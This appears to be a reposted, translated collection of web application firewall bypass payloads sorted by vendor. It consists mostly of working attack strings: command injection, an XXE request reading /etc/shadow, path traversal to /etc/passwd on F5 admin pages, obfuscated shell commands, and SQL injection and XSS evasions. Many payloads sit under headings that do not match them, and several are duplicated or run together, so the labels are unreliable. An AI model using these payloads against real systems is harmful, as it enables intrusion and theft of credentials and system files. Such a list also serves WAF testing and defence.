POST /dotDefender/index.cgi HTTP/1.1Host: 172.16.159.132User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Keep-Alive: 300Connection: keep-aliveAuthorization: Basic YWRtaW46Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 95sitename=dotdefeater&deletesitename=dotdefeater;id;ls -al ../;pwd;&action=deletesite&linenum=15
```

### **F5 FirePass**

SQLi Bypass from @Anonymous

```
GET /c?a=<script> HTTP/1.1Host: 172.16.159.132User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US;rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7<script>alert(1)</script>: aaKeep-Alive: 300
```

### **ModSecurity**

RCE Payloads Detection Bypass for PL3 by @theMiddle (v3.1)

```
<svg/onload=prompt(1);><isindex action="javas&tab;cript:alert(1)" type=image><marquee/onstart=confirm(2)>
```

RCE Payloads Detection Bypass for PL2 by @theMiddle (v3.1)

```
<p draggable=True ondragstart=prompt()>alert<bleh/ondragstart=	parent	['open']	()%20draggable=True>dragmeGET - XSS Bypass (v4.02) by @DavidK/search?q=%3Cimg%20src=%22WTF%22%20onError=alert(/0wn3d/.source)%20/%3E<img src="WTF" onError="{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v%2Ba%2Be%2Bs](e%2Bs%2Bv%2Bh%2Bn)(/0wn3d/.source)" />
```

RCE Payloads for PL1 and PL2 by @theMiddle (v3.0)

```
<img src="WTF" onError="{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/.source)" />clave XSS (v4.02) by @DavidK
```

RCE Payloads for PL3 by @theMiddle (v3.0)

```
<img src="WTF" onError="{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/0wn3d/.source)" />
```

SQLi Bypass by @Johannes Dahse (v2.2)

```
/?&idPais=3&clave=%3Cimg%20src=%22WTF%22%20onError=%22{
```

SQLi Bypass by @Yuri Goltsev (v2.2)

```
/?&idPais=3&clave=%3Cimg%20src=%22WTF%22%20onError=%22{
```

SQLi Bypass by @Ahmad Maulana (v2.2)

```
/waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0
```

```
/waf/pcre_expression/validate?redir=/success&mkey=0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C/waf/pcre_expression/validate?redir=/success%20%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C&mkey=0
```

SQLi Bypass by @Roberto Salgado (v2.2)

```
POST /<path>/login-app.aspx HTTP/1.1Host: <host>User-Agent: <any valid user agent string>Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: <the content length must be at least 2399 bytes>var1=datavar1&var2=datavar12&pad=<random data to complete at least 2399 bytes>
```

SQLi Bypass by @Georgi Geshev (v2.2)

```
http://<domain>/path?var1=vardata1&var2=vardata2&pad=<large arbitrary data>
```

SQLi Bypass by @SQLMap Devs (v2.2)

```
<table background="javascript:alert(1)"></table>"/><marquee onfinish=confirm(123)>a</marquee>
```

SQLi Bypass by @HackPlayers (v2.2)

```
<table background="javascript:alert(1)"></table>"/><marquee onfinish=confirm(123)>a</marquee>
```

### **Imperva**

Imperva SecureSphere 13 - Remote Command Execution by @rsp3ar

XSS Bypass by @David Y

```
<body style="height:1000px" onwheel="[DATA]"><div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]"><body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)"><div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
```

XSS Bypass by @Emad Shanab

```
<body style="height:1000px" onwheel="[DATA]"><div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]"><body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)"><div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
```

XSS Bypass by @WAFNinja

```
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)"><div contextmenu="xss">Right-Click Here<menu id="xss"onshow="prom%25%32%33%25%32%36x70;t(1)“>
```

XSS Bypass by @i_bo0om

```
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)"><div contextmenu="xss">Right-Click Here<menu id="xss"onshow="prom%25%32%33%25%32%36x70;t(1)“>
```

XSS Bypass by @c0d3g33k

```
https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+
```

SQLi Bypass by @DRK1WI

```
https://host/dms/policy/rep_request.php?report_type=%22%3E%3Cbody+onload=alert(%26quot%3BXSS%26quot%3B)%3E%3Cfoo+
```

SQLi by @Giuseppe D’Amore

```
POST /sam/admin/vpe2/public/php/server.php HTTP/1.1Host: bigipCookie: BIGIPAuthCookie=*VALID_COOKIE*Content-Length: 143<?xml version="1.0" encoding='utf-8' ?><!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]><message><dialogueType>&e;</dialogueType></message>
```

### **Kona SiteDefender**

HTML Injection by @sp1d3rs

```
POST /sam/admin/vpe2/public/php/server.php HTTP/1.1Host: bigipCookie: BIGIPAuthCookie=*VALID_COOKIE*Content-Length: 143<?xml version="1.0" encoding='utf-8' ?><!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]><message><dialogueType>&e;</dialogueType></message>
```

XSS Bypass by @Jonathan Bouman

```
/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwdDelete Arbitrary File
```

XSS Bypass by @zseano

```
/tmui/Control/jspmap/tmui/system/archive/properties.jsp?&name=../../../../../etc/passwd
```

XSS Bypass by @0xInfection

```
POST /tmui/Control/form HTTP/1.1Host: site.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateCookie: JSESSIONID=6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay=""; BIGIPAuthCookie=89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie=admin; F5_CURRENT_PARTITION=Common; f5formpage="/tmui/system/archive/properties.jsp?&; f5_refreshpage=/tmui/Control/jspmap/tmui/system/archive/properties.jsp%3Fname%3D../../../../../etc/passwdContent-Type: application/x-www-form-urlencoded_form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&showObjList=&showObjList_before=&hideObjList=&hideObjList_before=&enableObjList=&enableObjList_before=&disableObjList=&disableObjList_before=&_bufvalue=icHjvahr354NZKtgQXl5yh2b&_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&_bufvalue_validation=NO_VALIDATION&com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&linked_add_id=&linked_add_id_before=&name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&restore_before=Restore&delete=Delete&delete_before=Delete
```

XSS Bypass by @sp1d3rs

```
POST /tmui/Control/form HTTP/1.1Host: site.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateCookie: JSESSIONID=6C6BADBEFB32C36CDE7A59C416659494; f5advanceddisplay=""; BIGIPAuthCookie=89C1E3BDA86BDF9E0D64AB60417979CA1D9BE1D4; BIGIPAuthUsernameCookie=admin; F5_CURRENT_PARTITION=Common; f5formpage="/tmui/system/archive/properties.jsp?&; f5_refreshpage=/tmui/Control/jspmap/tmui/system/archive/properties.jsp%3Fname%3D../../../../../etc/passwdContent-Type: application/x-www-form-urlencoded_form_holder_opener_=&handler=%2Ftmui%2Fsystem%2Farchive%2Fproperties&handler_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&showObjList=&showObjList_before=&hideObjList=&hideObjList_before=&enableObjList=&enableObjList_before=&disableObjList=&disableObjList_before=&_bufvalue=icHjvahr354NZKtgQXl5yh2b&_bufvalue_before=icHjvahr354NZKtgQXl5yh2b&_bufvalue_validation=NO_VALIDATION&com.f5.util.LinkedAdd.action_override=%2Ftmui%2Fsystem%2Farchive%2Fproperties&com.f5.util.LinkedAdd.action_override_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties&linked_add_id=&linked_add_id_before=&name=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name_before=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&form_page=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&form_page_before=%2Ftmui%2Fsystem%2Farchive%2Fproperties.jsp%3F&download_before=Download%3A+..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&restore_before=Restore&delete=Delete&delete_before=Delete
```

XSS Bypass by @Frans Rosén

```
state=%2527+and+(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
```

XSS Bypass by @Ishaq Mohammed

```
state=%2527+and+(case+when+SUBSTRING(LOAD_FILE(%2527/etc/passwd%2527),1,1)=char(114)+then+BENCHMARK(40000000,ENCODE(%2527hello%2527,%2527batman%2527))+else+0+end)=0+--+
```

### **Profense**

GET Type CSRF Attack by @Michael Brooks (>= v.2.6.2)

Turn off Proface Machine

```
;+$u+cat+/etc$u/passwd$u
```

Add a proxy

```
;+$u+cat+/etc$u/passwd$u
```

XSS Bypass by @Michael Brooks (>= v.2.6.2)

```
;+$u+cat+/etc$u/passwd+\#
```

XSS Bypass by @EnableSecurity (>= v2.4)

```
;+$u+cat+/etc$u/passwd+\#
```

### **QuickDefense**

XSS Bypass by @WAFNinja

```
/???/??t+/???/??ss??
```

### **Sucuri**

Smuggling RCE Payloads by @theMiddle

```
/???/??t+/???/??ss??
```

Obfuscating RCE Payloads by @theMiddle

```
/?in/cat+/et?/passw?
```

XSS Bypass by @Luka

```
/?in/cat+/et?/passw?
```

XSS Bypass by @Brute Logic

```
0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
```

### **URLScan**

Directory Traversal by @ZeQ3uL (<= v3.1) (Only on ASP.NET)

```
0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
```

### **WebARX**

Cross Site Scripting by @0xInfection

```
1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
```

### **WebKnight**

Cross Site Scripting by @WAFNinja

```
1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
```

SQLi by @WAFNinja

```
1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-SQLi Bypass by @Travis Lee (v2.2)
```

XSS Bypass by @Aatif Khan (v4.1)

```
1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
```

SQLi Bypass by @ZeQ3uL

```
amUserId=1 union select username,password,3,4 from users
```

### **Wordfence**

XSS Bypass by @brute Logic

```
amUserId=1 union select username,password,3,4 from users
```

XSS Bypass by @0xInfection

```
%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
```

HTML Injection by @Voxel

```
%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
```

XSS Exploit by @MustLive (>= v3.3.5)  

```
1%0bAND(SELECT%0b1%20FROM%20mysql.x)
```

Other XSS Bypasses

```
1%0bAND(SELECT%0b1%20FROM%20mysql.x)
```

### **Apache Generic**

Writing method type in lowercase by @i_bo0om

```
%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
```

### **IIS Generic**  

Tabs before method by @i_bo0om

```
%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
```

### 翻译作者：jax777，作者博客：jax777.win

**推荐阅读**[**![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyIDG0WicDG27ztM2s7iaVSWKiaPdxYic8tYjCatQzf9FicdZiar5r7f7OgcbY4jFaTTQ3HibkFZIWEzrsGg/640?wx_fmt=png)**](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247494261&idx=1&sn=8e008b655fe25c2304edb0cfa1cdf264&chksm=9acd3aeaadbab3fcf857620968368e8fd39e1bf3f9767abb5b370c72558fb2f9ac2f5e234734&scene=21#wechat_redirect)  

****点击关注乌雲安全****

公众号

**觉得不错点个 **“赞”**、“在看”，支持下小编****![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3oQhT1YhlAJOGvAaVRV0ZSSnX46ibouOHe05icukBYibdJOiaOpO06ic5eb0EMW1yhjMNRe1ibu5HuNibCcrGsqw/640?wx_fmt=png)**